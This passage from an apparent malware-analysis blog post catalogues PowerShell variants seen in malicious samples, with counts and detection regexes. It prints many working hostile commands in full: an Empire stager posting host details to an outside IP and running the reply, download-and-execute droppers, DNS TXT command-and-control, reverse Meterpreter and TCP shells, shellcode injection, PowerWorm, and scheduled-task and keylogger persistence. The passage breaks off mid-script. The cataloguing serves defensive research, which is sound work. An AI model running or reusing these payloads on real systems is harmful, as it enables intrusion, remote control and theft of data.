\\'\\';$AES=NEw-ObJEct SYsTEm.SEcurity.CRyPtoGRAPHY.AEsCrYPtOSerVIcEPRoVidEr;$IV = [ByTe] 0..255 | GET-RaNdom -couNT 16;$AES.Mode=\"CBC\"; $AES.Key=$e.GetBytes($key); $AES.IV = $IV;$i=$S+\\'|\\'+[EnvIrONment]::UsERDOmAInNAmE+\\'|\\'+[ENvIRonmeNt]::UsERNaME+\\'|\\'+[ENvIRONmeNt]::MaChinEName;$P=(gwMi WIN32_NeTWorkAdAPTErCoNfIGurAtioN|WherE{$_.IPAdDRess}|SelECt -ExpANd IPADDReSS);$ip = @{$TrUe=$P[0];$FalsE=$P}[$P.LeNgTh -lt 6];If(!$IP -or $ip.trIm() -EQ \\'\\') {$Ip=\\'0.0.0.0\\'};$i+=\"|$ip\";$I+=\\'|\\'+(GEt-WmIOBJect WIn32_OpERAtiNgSystEM).NAME.splIT(\\'|\\')[0];if(([Environment]::UserName).ToLower() -eq \"system\"){$i+=\\'|True\\'}else {$i += \"|\" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")}$n=[SySTeM.DIAgNoSTICS.ProceSS]::GetCUrREntPRocEss();$i+=\\'|\\'+$n.PROCEssNAMe+\\'|\\'+$n.ID;$I += \\'|\\' + $PSVerSIOnTabLe.PSVerSioN.MAjOR;$ib2=$E.getbYteS($I);$EB2=$IV+$AES.CrEATEEncrYPToR().TrANSFORmFinALBLOCk($Ib2,0,$Ib2.LenGTH);$wc.Headers.Add(\"User-Agent\",$UA);$raw=$wc.UploadData($s+\"index.php\",\"POST\",$eb2);$AES=NeW-Object SYSteM.SEcuRIty.CRYPToGrapHY.AesCrYPToSeRVIcEProvIder;$AES.Mode=\"CBC\";$IV = $rAw[0..15];$AES.Key=$e.GETBYtes($key);$AES.IV = $IV;IEX $([SYstEM.TeXt.EnCoDInG]::ASCII.GetStrInG( $($AES.CrEateDECRYpTOr().TRANsFOrMFinAlBloCk($rAW[16..$RaW.LENGtH],0,$raw.LENGth-16))));$AES=$NuLL;$s2=$NuLl;$WC=$nUll;$eB2=$nULl;$RAW=$NuLl;$IV=$NULL;$WC=$NULl;$I=$NUlL;$iB2=$null;[GC]::COlLEcT();Invoke-Empire -Servers @(($s -split \"\/\")[0..2] -join \"\/\") -SessionKey $key -SessionID $ID -Epoch $epoch;} Start-Negotiate -s \"http:\/\/23.239.12.15:8080\/\" -SK \\'0192023a7bbd73250516f069df18b500\\' -UA $u;'\n\nDownloader DFSP 2X (81 Samples - 1.98% Coverage)\n\nThis is the same as the previous downloader but it launches yet another instance of PowerShell to carry out the download. These were all linked to the Cerber downloader documents as well.\nPowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http:\/\/93.174.94[.]135\/~kali\/ketty.exe', $env:APPDATA\\profilest.exe );Start-Process ( $env:APPDATA\\profilest.exe )\n\nDownloader DFSP DPL (24 Samples - 0.59% Coverage)\n\nAnother downloader using the DownloadFile -&gt; Start-Process technique that had two different variations within the sample set. A number of these samples matched behaviors related to Bartalex and may be indicative of changes to this well-known Office Macro generator.\n\nUnabridged \u2013\n ($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http:\/\/worldnit[.]com\/abu.exe', $deploylocation);Start-Process $deploylocation\n\nAbridged \u2013\n ($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http:\/\/alonqood[.]com\/abacom.exe', $dpl);Start-Process $dpl\n\nDownloader IEXDS (19 Samples \u2013 0.46% Coverage)\n\nThis is another spin on a downloader that frequently pops-up when searching for methods to download and execute scripts for PowerShell. Effectively, the code simply downloads a PowerShell script remotely and executes it with Invoke-Expression. The resulting payloads can be quite different from one another and didn\u2019t seem related.\n\nThe following two samples download an \u201cInvoke-TwitterBot\u201d script, which is \u201cA Trojan bot controlled by a twitter account that was released at ShmooCon IX\u201d.\nIEX (New-Object Net.WebClient).DownloadString('http:\/\/cannot.loginto[.]me\/googlehelper.ps1')\n\niex ((New-Object Net.WebClient).DownloadString('http:\/\/76.74.127[.]38\/default-nco.html'))\n\nBITSTransfer (11 Samples \u2013 0.27% Coverage)\n\nAnother mechanism for downloading malware via PowerShell is through the BitsTransfer module. Background Intelligent Transfer Service (BITS) isn\u2019t as frequently seen in downloading malware but offers similar functionality to other known transfer services, such as HTTP. Using this different method may allow attackers to avoid certain monitoring and take advantage of the fact that BITS will throttle transfers to not impact other bandwidth usage.\n\nIn my previous blog, I noted that a variant of the Cerber downloader was seen using BITS for a brief period of time and 10 out of these 11 samples were Microsoft Word documents leading to Cerber.\nImport-Module BitsTransfer\n$path = [environment]::getfolderpath(\"mydocuments\")\nStart-BitsTransfer -Source \"http:\/\/94.102.50[.]39\/keyt.exe\" -Destination \"$path\\keyt.exe\"\nInvoke-Item  \"$path\\keyt.exe\"\n\nTXT C2 (10 Samples \u2013 0.24% Coverage)\n\nFor this next one, the attacker uses PowerShell to make a DNS query for the TXT record of a domain. The TXT record contains another PowerShell script that is then passed to Invoke-Expression to execute.\nif(''+(nslookup -q=txt p.s.os.ns.rankingplac[.]pl) -match '@(.*)@'){iex $matches[1]}\n\nLooking at the script which is returned shows that once this initial look-up occurs, it will set itself into a constant loop continuing to query for the TXT record of the domain and base64 decoding then executing the result.\nNon-authoritative answer:\np.s.os.ns.rankingplac.pl\ttext = \"@$str=''\\;$i=1\\;while(1){if(''+(nslookup -q=txt \\\"l.$i.ns.rankingplac[.]pl.\\\") -match '@(.*)@'){$str += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))} else {break\\;}$i++}iex $str@\"\n\nThis allows the attacker to establish a command and control channel when they are ready to interact with the compromised system.\n\nJohn Lambert over at Microsoft recently tweeted about this variant and identified it as being used during penetration testing. Another example of the technique can be found in the Nishang framework for penetration testing.\n\nDownloader Proxy (9 Samples \u2013 0.22% Coverage)\n\nThis variant will explicitly use the configured proxy and credentials for the user running the PowerShell command. Of note for this one is the passing of the username as a value to the \u201cu\u201d parameter in the web request. This is a common \u201ccheck-in\u201d activity so the attacker knows whom they have infected; it can be used to further handle how subsequent interactions take place (e.g. block further connections if known sandbox username).\n$x=$Env:username;$u=\"http:\/\/54.213.195[.]138\/s2.txt?u=\" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;\n\nMeterpreter RHTTP (6 Samples \u2013 0.15% Coverage)\nThis next technique simply pulls down the Invoke-Shellcode script used in tools such as PowerShell Empire and PowerSploit, and then calls the function to generate a reverse HTTPS Meterpreter shell.\n\nAll but one of the samples pulled code from GitHub, either directly through the official repository or through a forked version.\n\nGitHub \u2013\niex (New-Object Net.WebClient).DownloadString(\"https:\/\/raw.githubusercontent.com\/PowerShellEmpire\/Empire\/master\/data\/module_source\/code_execution\/Invoke-Shellcode.ps1\"); Invoke-Shellcode -Payload windows\/meterpreter\/reverse_http -Lhost 88.160.254[.]183 -Lport 8080 -Force\n\nNon-GitHub \u2013\nIEX (New-Object Net.WebClient).DownloadString('http:\/\/el8[.]pw\/ps\/CodeExecution\/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows\/meterpreter\/reverse_https -Lhost 65.112.221[.]34 -Lport 443 \u2013Force\n\nDownloader Kraken (5 Samples \u2013 0.12% Coverage)\n\nI called this one \u201cKraken\u201d simply because of the filename of the executable it downloads, (\u201cKraken.jpg\u201d), but it uses a similar download technique as seen in Downloader DFSP. One difference is that instead of using the \u201c$env\u201d variable directly, it uses System.IO.Path to retrieve the path for the $TEMP directory.\n$TempDir = [System.IO.Path]::GetTempPath(); (New-Object System.Net.WebClient).DownloadFile(\"http:\/\/kulup.isikun.edu.tr\/Kraken.jpg\",\"  $TempDir\\syshost.exe\"); start $TempDir\\syshost.exe;\n\nAppLocker Bypass (4 Samples \u2013 0.12% Coverage)\n\nThis next technique uses PowerShell to run the regsvr32 tool to bypass Microsoft Windows AppLocker. This technique was found by Casey Smith (@subTee) and abuses the fact that scripts are executed when unregistering a COM object via regsvr32.\nregsvr32 \/u \/s \/i:http:\/\/&lt;IP_REDACTED&gt;\/test.jpg scrobj.dll\n\nEmbedded Payloads\n\nPowerShell code identified with the primary intention of launching embedded payloads, such as shellcode.\n\nShellcode Inject (1,147 Samples \u2013 27.98% Coverage),\n\nUnicorn (611 Samples \u2013 14.90% Coverage),\n\nSET (199 Samples \u2013 4.85% Coverage),\n\nUnicorn Modified (14 Samples \u2013 0.34% Coverage)\n\nAs I already showed examples of SET and Magic Unicorn\u2019s implementation of the Shellcode Injection technique, I\u2019ve decided to just lump all of the variants together using this shellcode injection template. Below is a sample from the \u201cShellcode Inject\u201d variant, which is a copy of Matt Graeber\u2019s original post, and you\u2019ll immediately see the similarities with the SET and Magic Unicorn code.\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,&lt;SHELLCODE&gt;,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\n\nWhile the Cerber downloader accounted for a large sum of the EncodedCommand found in Microsoft Word documents, these four variants use the same technique accounting for almost the entirety launched from EXE files.\n\nThe gist of the code is that they import functions from DLL\u2019s in the following order:\n\n \t\u201ckernel32.dll\u201d VirtualAlloc\n \t\u201ckernel32.dll\u201d CreateThread\n \t\u201cmsvcrt.dll\u201d memset\n\nThen they load their shellcode into an array of bytes using the \u201c0x\u201d hex representation. Next, they call VirtualAlloc to allocate, at minimum, a 4,096 byte page of RWX memory, copy the byte-array to memory with memset, and finally transfer execution to the shellcode with CreateThread.\n\nOut of the 1,971 samples, there were 1,211 unique shellcode payloads, indicating that over 50% of them were re-used in other attacks. Most of these tools utilize Metasploit to generate the shellcode and if they don\u2019t accept specifying a payload, generally opted for reverse Meterpreter shells. For example, the below line is from the Magic Unicorn\u2019s code showing how to specify the MSF payload.\nprint(\"PS Example: python unicorn.py windows\/meterpreter\/reverse_tcp 192.168.1.5 443\")\n\nThe underlying code for the generation of the payload, including platform, architecture, and encoding:\n\"msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86\/shikata_ga_nai -a x86 --platform windows --smallest -f c\" % (\n            payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n\nAnother interesting observation is that if you look at the shellcode length, the top 2 lengths were 294 and 312 bytes long, with 846 and 544 samples respectively; afterwards the sample counts fall off sharply.\n\n\n\nShellcode Length (Bytes)\nCount\n\n\n294\n846\n\n\n312\n544\n\n\n337\n145\n\n\n303\n131\n\n\n285\n46\n\n\n\n&nbsp;\n\nWhat makes this interesting is the sheer volume of identical lengths signals to me that they are likely generating the same payload with the same tools and using something without much possible variation in length, such as a 4-byte IP compared to a variable length URL as the C2.\n\nAs this blog serves to catalog the differences between these variants, below are regex queries to identify the specific variant.\n\nShellcode Inject\n\"^(\\$c = |\\$1 = [\\\"\\']\\$c = )\"\n\"\\$g = 0x1000\" \n\"\\$z\\.Length \\-gt 0x1000\"\n\"\\$z\\[\\$i\\]\"\n\nUnicorn\n\"\\$w \\= Add\\-Type \\-memberDefinition \\$[a-zA-Z0-9]{3,4} \\-Name\"\n\nSET\n\"\\$code \\= [\\']{1,2}\\[DllImport\"\n\"\\$sc\\.Length -gt 0x1000\\)\"\n\"\\$winFunc::memset\"\n\nUnicorn Modified\n\"^\\$[a-zA-Z0-9]{5,7} \\= \\'\\[DllImport.+Start\\-sleep 60\\}\\;\"\n\nPowerfun Reverse (100 Samples \u2013 2.44% Coverage),\n\nPowerfun Bind (2 Samples \u2013 0.05% Coverage)\n\nAnother variation to code execution was found inside Powerfun, more specifically they use Metasploit\u2019s \u201cwindows\/powershell_reverse_tcp\u201d and \u201cpowershell_bind_tcp\u201d payloads to create interactive shells with the target system. The reverse payload is encoded with base64 and launched via a background process using System.Diagnostics.Process.\n\nReverse payload \u2013\nif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\n\n\nThe bind payload sets up a TCP listener by listening with System.Net.Sockets.TCPClient and passing received PowerShell script to Invoke-Expression.\n\nBind payload \u2013\n$client = New-Object System.Net.Sockets.TCPClient(\"192.168.56.144\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\nPowerWorm (19 Samples \u2013 0.46% Coverage)\n\nPowerWorm is a malware family that TrendMicro blogged about in 2014 which has the capability of spreading by infecting other Microsoft Office DOC(X)\/XLS(X) files. The PowerShell code is obfuscated with \u201cjunk\u201d data placed between the legitimate commands.\n'xneZtEDC';$ErrorActionPreference = 'SilentlyContinue';'uqaaPxuaCN';'DOBHbJqlkRM';$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;'WVy';'gKEZgPRMl';if ((gp HKCU:\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) -match $kn){;'mUzql';'jsvZDTQITNa';(Get-Process -id $pid).Kill();'NgpYRhj';'hVXjCtDvBc';};'tUVXQmXbZ';'lkTzhJZHwxU';'McPzodeY';'vNNYv';function e($dkez){;'TfPD';'WTw';$jt = (((iex \"nslookup -querytype=txt $dkez 8.8.8.8\") -match '\"') -replace '\"', '')[0].Trim();'HdCjwAD';'sVSjtZRvr';$ovg.DownloadFile($jt, $tg);'raVw';'OQNdBkS';$ei = $ke.NameSpace($tg).Items();'OgnucmQlK';'Qfqxov';$ke.NameSpace($sa).CopyHere($ei, 20);'GBMdJNr';'VMWS';rd $tg;'pnoFau';'SedloE';};'NxPZPIV';'ypi';'AFElBzCp';'bYRWML';'UYANxqtLg';'QBC';$sa = $env:APPDATA + '\\' + $kn;'Eaxyty';'IwuaOh';if (!(Test-Path $sa)){;'amYmrKg';'vWAgqtEB';$qr = New-Item -ItemType Directory -Force -Path $sa;'GqNII';'HNPIQutUpGv';$qr.Attributes = \"Hidden\", \"System\", \"NotContentIndexed\";'MuRuRa';'CmlkCszVCO';};'ZdmIGyj';'nAYhOpvWV';'BIAgIntvoU';'GJTBzyjr';$zul=$sa+ '\\tor.exe';'swInqmX';'LTXwOFNSuL';$axs=$sa+ '\\polipo.exe';'qkI';'WJPoaNnarn';$tg=$sa+'\\'+$kn+'.zip';'Sgw';'fYthyZ';$ovg=New-Object System.Net.WebClient;'Ils';'GRldQfFnfQK';$ke=New-Object -C Shell.Application;'vVoutJQ';'gHXAsaxc';'llaetDv';'Zix';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'QtJINrwhS';'XkAxtKLAJ';e 'i.vankin.de';'QqVujkSIPS';'dZdn';};'GoemQSlIB';'IOcJU';'FYTMzpCupR';'qEnstu';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'ZGtSt';'mHkBgIOsU';e 'gg.ibiz.cc';'sDtXmE';'xSBk';};'YaiaAJqKPin';'gFVK';'TumvJVvJKRm';'ULQwp';$pj=$sa+'\\roaminglog';'numdmmhA';'ytEF';saps $zul -Ar \" --Log `\"notice file $pj`\"\" -wi Hidden;'JCBc';'CjHbOtf';do{sleep 1;$xxl=gc $pj}while(!($xxl -match 'Bootstrapped 100%: Done.'));'wYtpNVJtdz';'XggiQIPFt';saps $axs -a \"socksParentProxy=localhost:9050\" -wi Hidden;'dlV';'zVLSO';sleep 7;'FzlDdEynuUz';'Ci';$zpp=New-Object System.Net.WebProxy(\"localhost:8123\");'MsOkmLs';'zRW';$zpp.useDefaultCredentials = $true;'PWXVXIMqb';'lAy';$ovg.proxy=$zpp;'gEkdkGPjVp';'xerooSjz';$ca='http:\/\/powerwormjqj42hu[.]onion\/get.php?s=setup&amp;mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&amp;uid=' + $kn;'SGCFq';'GkVVnp';while(!$qmh){$qmh=$ovg.downloadString($ca)};'rHo';'jtshvrR';if ($qmh -ne 'none'){;'Ju';'VuUTlp';iex $qmh;'blhE';'AeIepyNd';};'whSp';\n\nCleaned-up slightly \u2013\n$ErrorActionPreference = 'SilentlyContinue';\n$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;\n\nif ((gp HKCU:\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) -match $kn) {;\n\t(Get-Process -id $pid).Kill();\n};\n\nfunction e($dkez){;\n\t$jt = (((iex \"nslookup -querytype=txt $dkez 8.8.8.8\") -match '\"') -replace '\"', '')[0].Trim();\n\t$ovg.DownloadFile($jt, $tg);\n\t$ei = $ke.NameSpace($tg).Items();\n\t$ke.NameSpace($sa).CopyHere($ei, 20);\n\trd $tg;\n};\n\n$sa = $env:APPDATA + '\\' + $kn;\nif (!(Test-Path $sa)){;\n\t$qr = New-Item -ItemType Directory -Force -Path $sa;\n\t$qr.Attributes = \"Hidden\", \"System\", \"NotContentIndexed\";\n};\t\n\n$zul=$sa+ '\\tor.exe';\n$axs=$sa+ '\\polipo.exe';\n$tg=$sa+'\\'+$kn+'.zip';\n$ovg=New-Object System.Net.WebClient;\n$ke=New-Object -C Shell.Application;\n\nif (!(Test-Path $zul) -or !(Test-Path $axs)){;\n\te 'i.vankin.de';\n};\nif (!(Test-Path $zul) -or !(Test-Path $axs)){;\n\te 'gg.ibiz.cc';\n};\n\n$pj=$sa+'\\roaminglog';\nsaps $zul -Ar \" --Log `\"notice file $pj`\"\" -wi Hidden;\n\ndo{\n\tsleep 1;\n\t$xxl=gc $pj\n} while(!($xxl -match 'Bootstrapped 100%: Done.'));\n\nsaps $axs -a \"socksParentProxy=localhost:9050\" -wi Hidden;\nsleep 7;\n$zpp=New-Object System.Net.WebProxy(\"localhost:8123\");\n$zpp.useDefaultCredentials = $true;\n$ovg.proxy=$zpp;\n$ca='http:\/\/powerwormjqj42hu[.]onion\/get.php?s=setup&amp;mom=&amp;uid=' + $kn;\n\nwhile(!$qmh){\n\t$qmh=$ovg.downloadString($ca)\n};\n\nif ($qmh -ne 'none'){;\n\tiex $qmh;\n};\n\nThe code will download Tor and Polipo by fetching download URL\u2019s for the software from DNS TXT records and then eventually use the software to continuously check for new PowerShell commands that get passed to Invoke-Expression. Matt Graeber has done an excellent job of analyzing the full capabilities of this malware and provides de-obfuscated, commented, versions of the underlying PowerShell.\n\nVeil Stream (7 Samples \u2013 0.17% Coverage)\n\nThis is a similar technique as described in the \u201cPowerfun Reverse\u201d variant. The PowerShell code is injected into memory from a base64 string and executed with Invoke-Expression that eventually launches the actual shellcode payload. The layout of the code correlates to the Veil Framework implementation.\nInvoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\n\nPersistence\n\nPowerShell code identified with the primary intention of establishing persistence on the host.\n\nScheduled Task COM (11 Samples \u2013 0.27% Coverage)\n\nThis variant seeks to create a persistence mechanism by creating a Scheduled Task that runs the malicious binary. The PE file this sample comes from drops a \u201cminecraft.exe\u201d and then launches this PowerShell command below - most likely, as it\u2019s easier to pass this type of functionality off to PowerShell instead of trying to write the code into the original dropper.\n\nThe technique was seen primarily is samples associated to the Retefe banking trojan.\n$TaskName = \"Microsoft Windows Driver Update\"\n$TaskDescr = \"Microsoft Windows Driver Update Services\"\n$TaskCommand = \"C:\\ProgramData\\WindowsUpgrade\\minecraft.exe\"\n$TaskScript = \"\"\n$TaskArg = \"\"\n$TaskStartTime = [datetime]::Now.AddMinutes(1)\n$service = new-object -ComObject(\"Schedule.Service\")\n$service.Connect()\n$rootFolder = $service.GetFolder(\"\\\")\n$TaskDefinition = $service.NewTask(0)\n$TaskDefinition.RegistrationInfo.Description = \"$TaskDescr\"\n$TaskDefinition.Settings.Enabled = $true\n$TaskDefinition.Settings.Hidden = $true\n$TaskDefinition.Settings.RestartCount = \"5\"\n$TaskDefinition.Settings.StartWhenAvailable = $true\n$TaskDefinition.Settings.StopIfGoingOnBatteries = $false\n$TaskDefinition.Settings.RestartInterval = \"PT5M\"\n$triggers = $TaskDefinition.Triggers\n$trigger = $triggers.Create(8)\n$trigger.StartBoundary = $TaskStartTime.ToString(\"yyyy-MM-dd'T'HH:mm:ss\")\n$trigger.Enabled = $true\n$trigger.Repetition.Interval = \"PT5M\"\n$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true\n$Action = $TaskDefinition.Actions.Create(0)\n$action.Path = \"$TaskCommand\"\n$action.Arguments = \"$TaskArg\"\n$rootFolder.RegisterTaskDefinition(\"$TaskName\",$TaskDefinition,6,\"System\",$null,5)\nSCHTASKS \/run \/TN $TaskName\n\nVB Task (10 Samples \u2013 0.24% Coverage)\n\nThis grouping of PowerShell code originally comes from a PE that executes PowerShell with the EncodedCommand, which then creates a VBScript that is installed as a Scheduled Task. The VBSript simply launches another PowerShell script once it runs to achieve this.\n$path= \"$env:userprofile\\appdata\\local\\microsoft\\Windows\"\n\nif(-not(Test-Path -Path($path)))\n{mkdir $path}\n\n$fileout=\"$path\\L69742.vbs\";\n\n$encstrvbs=\"c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K\";\n\n$bytevbs=[System.Convert]::FromBase64String($encstrvbs);\n\n$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);\n\n$strvbs = $strvbs.replace('#dpath#',$path);\n\nset-content $fileout $strvbs;\n\n$tmpfile=\"$env:TEMP\\U1848931.TMP\";\n\n$pscode_b64  =get-content $tmpfile | out-string;\n\n$pscode_b64=$pscode_b64.trim();\n\n$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))\n\n$id = [string](get-random -min 10000 -max 100000)\n\n$pscode = $pscode.replace('#id#',$id);\n\nset-content \"$path\\mc.ps1\" $pscode\n\n$taskstr=\"schtasks \/create \/F \/sc minute \/mo 2 \/tn \"\"GoogleServiceUpdate\"\" \/tr \"\"\\\"\"$fileout\"\"\\\"\"   \";\n\niex 'cmd \/c $taskstr';\n{{CODE}}\n\nThe base64 decoded VBScript \u2013\n\n{{CODE}}\nset wss = CreateObject(\"WScript.Shell\")\nstr = \"power\" &amp; \"sh\" &amp; \"ell\" &amp; \".e\" &amp; \"xe -NoP -sta -NonI -e\" &amp; \"xe\" &amp; \"c byp\" &amp; \"as\" &amp; \"s -fi\" &amp; \"le \"\npath = \"#dpath#\"\nstr = str + path + \"\\mc.ps1\"\nwss.Run str, 0\n\nDynAmite Launcher (6 Samples \u2013 0.15% Coverage),\n\nDynAmite KL (1 Sample \u2013 0.02% Coverage)\n\nDynAmite is a \u201cMalware Creation Toolkit\u201d which comes with your standard capabilities that one comes to expect with such a tool.\n\n\n\nIt does give you the ability to mix and match the features you want and generates a PE wrapper that carries out the selected tasks, usually by simply executing PowerShell commands. The majority of code that I saw generated by this kit was taken from public tools but used swapped around variable names and locations.\n\nThe \u201cDynAmite Launcher\u201d variant covers the persistence aspect, which is established through creating Scheduled Tasks. Below are three different iterations of this, most likely from different versions and configurations.\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\DynAmite\\Backdoor\" \/XML C:\\Windows\\Temp\\task.xml\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\DynAmite\\Keylogger\" \/XML C:\\Windows\\Temp\\task2.xml\nSCHTASKS \/run \/TN \"Microsoft\\Windows\\DynAmite\\Backdoor\"\nSCHTASKS \/run \/TN \"Microsoft\\Windows\\DynAmite\\Keylogger\"\nRemove-Item \"C:\\Windows\\Temp\\*.xml\"\n\n#create backdoor task\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\DynAmite\\DynAmite\" \/XML C:\\Windows\\Temp\\dynatask.xml\n#create upload task\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\DynAmite\\Uploader\" \/XML C:\\Windows\\Temp\\upltask.xml\n#run backdoor task\nSCHTASKS \/run \/TN \"Microsoft\\Windows\\DynAmite\\DynAmite\"\n#create registry entries for keylogger and screenspy\nNew-ItemProperty -path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name Keylogger -PropertyType String -Value \"C:\\Windows\\dynakey.exe\"\nNew-ItemProperty -path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name ScreenSpy -PropertyType String -Value \"C:\\Windows\\dynascr.exe\"\n#run keylogger and screenspy\nC:\\Windows\\dynakey.exe\nC:\\Windows\\dynascr.exe\n#cleanup temp folder\nRemove-Item \"C:\\Windows\\Temp\\*\"\n\n$loot = ($env:LOCALAPPDATA + \"\\dyna\\\"); md $loot\ncertutil -decode res.crt ($loot + \"res\"); certutil -decode kl.crt ($loot + \"kl.exe\"); certutil -decode st.crt ($loot + \"st.exe\");  certutil -decode cry.crt ($loot + \"cry.exe\"); certutil -decode t1.crt ($env:TEMP + \"\\t1.xml\"); certutil -decode t2.crt ($env:TEMP + \"\\t2.xml\"); certutil -decode t3.crt ($env:TEMP + \"\\t3.xml\"); certutil -decode t4.crt ($env:TEMP + \"\\t4.xml\"); certutil -decode t5.crt ($env:TEMP + \"\\t5.xml\"); certutil -decode bd.crt C:\\ProgramData\\bd.exe\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\Windows Printer Manager\\1\" \/XML ($env:TEMP + \"\\t1.xml\")\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\Windows Printer Manager\\2\" \/XML ($env:TEMP + \"\\t2.xml\")\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\Windows Printer Manager\\3\" \/XML ($env:TEMP + \"\\t3.xml\")\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\Windows Printer Manager\\4\" \/XML ($env:TEMP + \"\\t4.xml\")\nschtasks.exe \/create \/TN \"Microsoft\\Windows\\Windows Printer Manager\\5\" \/XML ($env:TEMP + \"\\t5.xml\")\nschtasks.exe \/run \/TN \"Microsoft\\Windows\\Windows Printer Manager\\1\"\nschtasks.exe \/run \/TN \"Microsoft\\Windows\\Windows Printer Manager\\2\"\nschtasks.exe \/run \/TN \"Microsoft\\Windows\\Windows Printer Manager\\3\"\nschtasks.exe \/run \/TN \"Microsoft\\Windows\\Windows Printer Manager\\4\"\nschtasks.exe \/run \/TN \"Microsoft\\Windows\\Windows Printer Manager\\5\"\nRemove-Item ($env:TEMP + \"\\*.xml\") -Recurse \u2013Force\n\nFor the \u201cDynAmite KL\u201d variant, it\u2019s the keylogger portion of the kit but directly lifts code from an older version of the PowerSploit function Get-Keystrokes. Below are the meat of the script and a comparison of the two pieces, showing how DynAmite changes the location of the variables and types.\n\nGet-Keystrokes \u2013\n$LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000\n$RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000\n$LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000\n$RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000\n$LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000\n$RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000\n$TabKey       = 